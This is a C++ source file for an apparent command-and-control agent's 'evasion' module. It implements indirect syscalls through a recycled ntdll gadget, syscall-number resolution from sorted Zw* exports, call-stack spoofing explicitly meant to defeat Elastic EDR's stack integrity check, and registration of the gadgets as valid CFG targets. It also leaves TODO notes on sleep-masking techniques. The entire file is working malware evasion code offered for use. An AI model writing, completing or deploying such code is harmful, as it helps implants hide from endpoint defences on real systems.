// __NAME__ Agent — RecycleGate implementation
//
// Phase 1: DWhisper SSN resolution
// Phase 2: RecycleGate gadget scan (random Nt* stub → syscall;ret)
// Phase 3: SilentMoonwalk DESYNC 4-frame stack spoofing

#include "RecycleGate.h"
#include <string.h>

namespace evasion {

// ─── Constructor / Destructor ─────────────────────────────────────────────

RecycleGate::RecycleGate()
    : mode_(0)
    , initialized_(false)
    , ssnCount_(0)
    , reCycGadget_(0)
    , desync_{}
    , ntdllBase_(0)
    , kernel32Base_(0)
    , kernelbaseBase_(0)
{}

RecycleGate::~RecycleGate() {
    Close();
}

// ─── IEvasionGate::Init ──────────────────────────────────────────────────

BOOL RecycleGate::Init() {
    if (initialized_) return TRUE;

    // Resolve module bases via PEB walk
    ntdllBase_      = findModuleByHash(HASH_NTDLL);
    kernel32Base_   = findModuleByHash(HASH_KERNEL32);
    kernelbaseBase_ = findModuleByHash(HASH_KERNELBASE);

    if (!ntdllBase_) return FALSE;

    // Phase 1: DWhisper SSN table
    if (!initSsnTable()) return FALSE;

    // Phase 2: RecycleGate gadget
    if (!initRecycleGadget(ntdllBase_)) return FALSE;

    // Phase 3: DESYNC frame gadgets
    if (!initDesync()) return FALSE;

    // CFG compliance: register mid-function gadgets as valid call targets
    registerCfgTargets();

    initialized_ = true;
    return TRUE;
}

// ─── Phase 1: DWhisper SSN Table ─────────────────────────────────────────
// Enumerate all Zw* exports from ntdll, bubble-sort by VA.
// SSN = sorted index (matches kernel SSN allocation order).

bool RecycleGate::initSsnTable() {
    if (!collectZwExports(ntdllBase_)) return false;
    bubbleSortExports();
    // Assign SSN by sorted position
    for (int i = 0; i < ssnCount_; i++) {
        ssnTable_[i].ssn = static_cast<uint16_t>(i);
    }
    return ssnCount_ > 0;
}

bool RecycleGate::collectZwExports(uintptr_t ntdllBase) {
    IMAGE_DOS_HEADER* dos;
    IMAGE_NT_HEADERS* nt;
    if (!validateDosNt(ntdllBase, &dos, &nt))
        return false;

    auto& expDir = nt->OptionalHeader.DataDirectory[DIR_EXPORT];
    if (expDir.VirtualAddress == 0) return false;

    auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(ntdllBase + expDir.VirtualAddress);
    auto* names    = reinterpret_cast<uint32_t*>(ntdllBase + exp->AddressOfNames);
    auto* funcs    = reinterpret_cast<uint32_t*>(ntdllBase + exp->AddressOfFunctions);
    auto* ordinals = reinterpret_cast<uint16_t*>(ntdllBase + exp->AddressOfNameOrdinals);

    ssnCount_ = 0;
    for (uint32_t i = 0; i < exp->NumberOfNames && ssnCount_ < MAX_SSN_ENTRIES; i++) {
        auto* name = reinterpret_cast<const char*>(ntdllBase + names[i]);

        // DWhisper: only Zw* prefixed exports carry SSNs
        if (name[0] != 'Z' || name[1] != 'w') continue;

        ssnTable_[ssnCount_].nameHash       = djb2HashRuntime(name);
        ssnTable_[ssnCount_].address         = ntdllBase + funcs[ordinals[i]];
        ssnTable_[ssnCount_].ssn             = 0; // assigned after sort
        ssnCount_++;
    }
    return true;
}

void RecycleGate::bubbleSortExports() {
    // Bubble sort by VA — SSN = position in sorted order
    for (int i = 0; i < ssnCount_ - 1; i++) {
        for (int j = 0; j < ssnCount_ - i - 1; j++) {
            if (ssnTable_[j].address > ssnTable_[j + 1].address) {
                SsnEntry tmp = ssnTable_[j];
                ssnTable_[j] = ssnTable_[j + 1];
                ssnTable_[j + 1] = tmp;
            }
        }
    }
}

bool RecycleGate::ResolveSsn(uint32_t apiHash, uint16_t* outSsn, uintptr_t* outAddr) {
    // API names passed as Nt* hashes. Zw* and Nt* share SSNs.
    // Convert Nt* hash → Zw* hash by rehashing with "Zw" prefix.
    // Alternatively, just use the address mapping. Since Zw* and Nt*
    // share the same stub addresses on Win10+, we can look up by address.
    //
    // Strategy: Accept both Zw* and Nt* hashes. First try direct hash match
    // in the table (Zw* hashes). For Nt* hashes, resolve the Nt* export
    // address from ntdll, then find the matching entry by address.

    // Direct table lookup (Zw* hash)
    for (int i = 0; i < ssnCount_; i++) {
        if (ssnTable_[i].nameHash == apiHash) {
            *outSsn  = ssnTable_[i].ssn;
            *outAddr = ssnTable_[i].address;
            return true;
        }
    }

    // Nt* hash: resolve via export table then match by address
    uintptr_t ntAddr = resolveExportByHash(ntdllBase_, apiHash);
    if (ntAddr == 0) return false;

    for (int i = 0; i < ssnCount_; i++) {
        if (ssnTable_[i].address == ntAddr) {
            *outSsn  = ssnTable_[i].ssn;
            *outAddr = ssnTable_[i].address;
            return true;
        }
    }
    return false;
}

// ─── Phase 2: RecycleGate Gadget ─────────────────────────────────────────
// Random-shuffle Nt* exports, scan VA+18 for 0F 05 C3 (syscall;ret).

bool RecycleGate::initRecycleGadget(uintptr_t ntdllBase) {
    // Collect all exports into temporary buffer
    ExportEntry allExports[2048];
    int count = getExports(ntdllBase, allExports, 2048);
    if (count == 0) return false;

    // Simple LCG shuffle (good enough for gadget diversity)
    uintptr_t seed = reinterpret_cast<uintptr_t>(&seed) ^ 0x5DEECE66D;
    for (int i = count - 1; i > 0; i--) {
        seed = seed * 6364136223846793005ULL + 1;
        int j = static_cast<int>((seed >> 33) % static_cast<uint64_t>(i + 1));
        ExportEntry tmp = allExports[i];
        allExports[i] = allExports[j];
        allExports[j] = tmp;
    }

    // Scan each export's stub for syscall;ret pattern
    for (int i = 0; i < count; i++) {
        uintptr_t va = allExports[i].virtualAddress;
        auto* bytes = reinterpret_cast<uint8_t*>(va + 18);
        if (bytes[0] == 0x0F && bytes[1] == 0x05 && bytes[2] == 0xC3) {
            reCycGadget_ = va + 18; // points to syscall instruction
            return true;
        }
    }
    return false;
}

// ─── Phase 3: SilentMoonwalk DESYNC ──────────────────────────────────────
// Find 4-frame gadget set with Eclipse JmpRbx validation.
// Cascade: wininet → user32 → kernelbase for JmpRbx gadgets.

bool RecycleGate::initDesync() {
    DesyncContext* dctx = &desync_;

    // JmpRbx cascade: try loaded modules in order
    uint32_t cascade[] = { HASH_WININET, HASH_USER32, HASH_KERNELBASE };
    bool found = false;

    for (auto mh : cascade) {
        uintptr_t base = findModuleByHash(mh);
        if (!base) continue;
        if (findDesyncGadgets(mh, dctx)) {
            found = true;
            break;
        }
    }

    if (!found) return false;

    // FirstFrame: SET_FPREG — terminates unwinder walk.
    // Try host .exe first (PEB.ImageBaseAddress): having the host .exe in the
    // spoofed call stack defeats Elastic EDR's stack integrity check, which
    // flags threads whose entire stack contains only system DLL addresses.
    // Falls back to kernelbase if the .exe has no suitable SET_FPREG frame.
    FrameSearchResult f1;
    bool foundF1 = false;
    uintptr_t exeBase = getProcessImageBase();
    if (exeBase && findSetFpregFrame(exeBase, MIN_JMP_RBX_FRAME_SIZE, &f1)) {
        foundF1 = true;
    }
    if (!foundF1 && kernelbaseBase_ &&
        findSetFpregFrame(kernelbaseBase_, MIN_JMP_RBX_FRAME_SIZE, &f1)) {
        foundF1 = true;
    }
    if (foundF1) {
        dctx->firstFrameAddr = f1.funcAddr;
        dctx->firstFrameSize = f1.frameSize;
    } else {
        return false;
    }

    // SecondFrame: PUSH_NONVOL(RBP) in kernelbase
    FrameSearchResult f2;
    if (kernelbaseBase_ && findPushRbpFrame(kernelbaseBase_, &f2)) {
        dctx->secondFrameAddr = f2.funcAddr;
        dctx->secondFrameSize = f2.frameSize;
        dctx->rbpPlantOffset  = f2.rbpOffset;
    } else {
        return false;
    }

    return true;
}

bool RecycleGate::findDesyncGadgets(uint32_t moduleHash, DesyncContext* ctx) {
    uintptr_t base = findModuleByHash(moduleHash);
    if (!base) return false;

    // JmpRbx: FF 23 with Eclipse (CALL-preceded), largest frame ≥ D8
    uintptr_t jmpAddr, jmpFS;
    if (!findJmpRbxGadget(base, MIN_JMP_RBX_FRAME_SIZE, true, &jmpAddr, &jmpFS))
        return false;

    ctx->jmpRbxGadget   = jmpAddr;
    ctx->jmpRbxFrameSize = jmpFS;

    // AddRspX: smallest sufficient, min B0
    uintptr_t arAddr, arX, arFS;
    if (!findAddRspXGadget(base, MIN_ADD_RSP_X, &arAddr, &arX, &arFS))
        return false;

    ctx->addRspXGadget = arAddr;
    ctx->addRspXValue  = arX;

    return true;
}

// ─── Phase 4: Sleep obfuscation — TODO ───────────────────────────────────
// Implement your own sleep masking strategy here. Typical approaches:
//   - Encrypt .text + heap during sleep (requires PIC trampoline on separate RX page)
//   - Suspend sibling threads to prevent races during encryption
//   - Use NtDelayExecution or timer-based sleep instead of Sleep()
//   - Rotate encryption keys between cycles
// The chSyscall5/6 helpers in syscall.S provide direct unspoofed SYSCALL
// dispatch that can be used for the bootstrap calls (NtProtect, NtDelay, etc.)
// without recursing through DESYNC.

// ─── CFG Compliance ──────────────────────────────────────────────────────
// Register mid-function gadget addresses as valid CFG call targets.
// Best-effort: silently skipped if SetProcessValidCallTargets is unavailable.

bool RecycleGate::registerCfgTargets() {
    if (!kernelbaseBase_) return false;

    using FnSetPVCT = BOOL (WINAPI *)(HANDLE, PVOID, SIZE_T, ULONG, void*);
    auto fnSet = reinterpret_cast<FnSetPVCT>(
        resolveExportByHash(kernelbaseBase_, HASH_SetProcessValidCallTargets));
    if (!fnSet) return false;

    // CFG_CALL_TARGET_INFO: { ULONG_PTR Offset; ULONG_PTR Flags; }
    struct CfgEntry { uintptr_t Offset; uintptr_t Flags; };
    constexpr uintptr_t CFG_VALID  = 0x00000001;
    constexpr uintptr_t PAGE_MASK  = ~static_cast<uintptr_t>(0xFFF);

    // Mid-function gadget addresses used by indirect syscall / DESYNC
    uintptr_t targets[] = {
        reCycGadget_,                   // Phase 2: recycled syscall;ret in ntdll
        desync_.jmpRbxGadget,           // Phase 3: DESYNC JMP [RBX]
        desync_.addRspXGadget,          // Phase 3: DESYNC ADD RSP,X
    };

    for (auto addr : targets) {
        if (addr == 0) continue;
        uintptr_t base = addr & PAGE_MASK;
        CfgEntry entry = { addr - base, CFG_VALID };
        fnSet(reinterpret_cast<HANDLE>(static_cast<intptr_t>(-1)),
              reinterpret_cast<PVOID>(base), 0x1000,
              1, &entry);
    }

    return true;
}

// ─── IEvasionGate::Syscall ───────────────────────────────────────────────

uint32_t RecycleGate::Syscall(uint16_t num, uintptr_t* args, int argCount) {
    uintptr_t a1 = (argCount > 0) ? args[0] : 0;
    uintptr_t a2 = (argCount > 1) ? args[1] : 0;
    uintptr_t a3 = (argCount > 2) ? args[2] : 0;
    uintptr_t a4 = (argCount > 3) ? args[3] : 0;
    uintptr_t a5 = (argCount > 4) ? args[4] : 0;
    uintptr_t a6 = (argCount > 5) ? args[5] : 0;

    auto dispatchRecycle = [&](void) -> uint32_t {
        switch (argCount) {
        case 0:
        case 1:
        case 2:
        case 3:
        case 4:
            return static_cast<uint32_t>(reCycall(num, reCycGadget_, a1, a2, a3, a4));
        case 5:
            return static_cast<uint32_t>(reCycall5(num, reCycGadget_, a1, a2, a3, a4, a5));
        case 6:
            return static_cast<uint32_t>(reCycall6(num, reCycGadget_, a1, a2, a3, a4, a5, a6));
        default:
            return 0xFFFFFFFFu;
        }
    };

    switch (mode_) {
    case 0:
        // Mode 0: Indirect syscall via recycled gadget (no spoofing)
        if (uint32_t st = dispatchRecycle(); st != 0xFFFFFFFFu) {
            return st;
        }
        break;

    case 1: {
        // Mode 1: DESYNC spoofed for ≤4 args, recycled gadget for >4
        bool desyncOk = desync_.addRspXGadget != 0
                     && desync_.jmpRbxGadget  != 0
                     && reCycGadget_          != 0;
        if (desyncOk && argCount <= 4) {
            return static_cast<uint32_t>(
                reCycallDesync(num, &desync_, a1, a2, a3, a4, reCycGadget_));
        }
        if (uint32_t st = dispatchRecycle(); st != 0xFFFFFFFFu) {
            return st;
        }
        break;
    }

    default:
        return 0xC0000001; // STATUS_UNSUCCESSFUL
    }

    // Fallback for wider syscalls: call the original ntdll stub directly.
    uintptr_t stub = 0;
    for (int i = 0; i < ssnCount_; i++) {
        if (ssnTable_[i].ssn == num) {
            stub = ssnTable_[i].address;
            break;
        }
    }
    if (!stub) {
        return 0xC0000001;
    }

    switch (argCount) {
    case 7: {
        using Fn = uintptr_t(*)(uintptr_t, uintptr_t, uintptr_t, uintptr_t,
                                 uintptr_t, uintptr_t, uintptr_t);
        return static_cast<uint32_t>(reinterpret_cast<Fn>(stub)(a1, a2, a3, a4, a5, a6, args[6]));
    }
    case 8: {
        using Fn = uintptr_t(*)(uintptr_t, uintptr_t, uintptr_t, uintptr_t,
                                 uintptr_t, uintptr_t, uintptr_t, uintptr_t);
        return static_cast<uint32_t>(reinterpret_cast<Fn>(stub)(a1, a2, a3, a4, a5, a6, args[6], args[7]));
    }
    case 9: {
        using Fn = uintptr_t(*)(uintptr_t, uintptr_t, uintptr_t, uintptr_t,
                                 uintptr_t, uintptr_t, uintptr_t, uintptr_t,
                                 uintptr_t);
        return static_cast<uint32_t>(reinterpret_cast<Fn>(stub)(a1, a2, a3, a4, a5, a6, args[6], args[7], args[8]));
    }
    case 10: {
        using Fn = uintptr_t(*)(uintptr_t, uintptr_t, uintptr_t, uintptr_t,
                                 uintptr_t, uintptr_t, uintptr_t, uintptr_t,
                                 uintptr_t, uintptr_t);
        return static_cast<uint32_t>(reinterpret_cast<Fn>(stub)(a1, a2, a3, a4, a5, a6, args[6], args[7], args[8], args[9]));
    }
    case 11: {
        using Fn = uintptr_t(*)(uintptr_t, uintptr_t, uintptr_t, uintptr_t,
                                 uintptr_t, uintptr_t, uintptr_t, uintptr_t,
                                 uintptr_t, uintptr_t, uintptr_t);
        return static_cast<uint32_t>(reinterpret_cast<Fn>(stub)(a1, a2, a3, a4, a5, a6, args[6], args[7], args[8], args[9], args[10]));
    }
    default:
        return 0xC0000001;
    }
}

// ─── IEvasionGate::ResolveFn ─────────────────────────────────────────────
// Resolve by module hash + function hash (no plaintext strings)

uintptr_t RecycleGate::ResolveFn(const char* module, const char* function) {
    uint32_t modHash  = djb2HashRuntime(module);
    uint32_t funcHash = djb2HashRuntime(function);

    uintptr_t base = findModuleByHash(modHash);
    if (!base) return 0;


    return resolveExportByHash(base, funcHash);
}

// ─── IEvasionGate::Call ──────────────────────────────────────────────────

uintptr_t RecycleGate::Call(uintptr_t fn, uintptr_t* args, int argCount) {
    using Fn = uintptr_t(*)(uintptr_t, uintptr_t, uintptr_t, uintptr_t);
    return reinterpret_cast<Fn>(fn)(
        (argCount > 0) ? args[0] : 0,
        (argCount > 1) ? args[1] : 0,
        (argCount > 2) ? args[2] : 0,
        (argCount > 3) ? args[3] : 0
    );
}

// ─── ConfigureSleep / SleepMasked ────────────────────────────────────────
// TODO: Implement your sleep obfuscation strategy.
// Typical approaches include:
//   - Encrypt .text + heap during sleep via PIC trampoline
//   - Timer-based sleep (NtSetTimer / CreateTimerQueueTimer)
//   - Thread pool sleep (TP_TIMER callbacks)
//   - Suspend sibling threads to prevent races
//   - Rotate encryption keys between cycles
// Use chSyscall5/6 for bootstrap calls that must avoid DESYNC recursion.

bool RecycleGate::ConfigureSleep(uintptr_t regionBase, uintptr_t regionSize,
                                  uint32_t sleepMs, uint32_t jitter) {
    (void)regionBase; (void)regionSize; (void)sleepMs; (void)jitter;
    // TODO: store region info and prepare sleep parameters
    return false;
}

void RecycleGate::SleepMasked(DWORD ms) {
    // TODO: replace with your sleep obfuscation implementation
    Sleep(ms);
}

// ─── IEvasionGate::Close ─────────────────────────────────────────────────

void RecycleGate::Close() {
    memset(&desync_, 0, sizeof(desync_));
    memset(ssnTable_, 0, sizeof(ssnTable_));
    ssnCount_    = 0;
    reCycGadget_ = 0;
    initialized_ = false;
    mode_        = 0;
}

} // namespace evasion
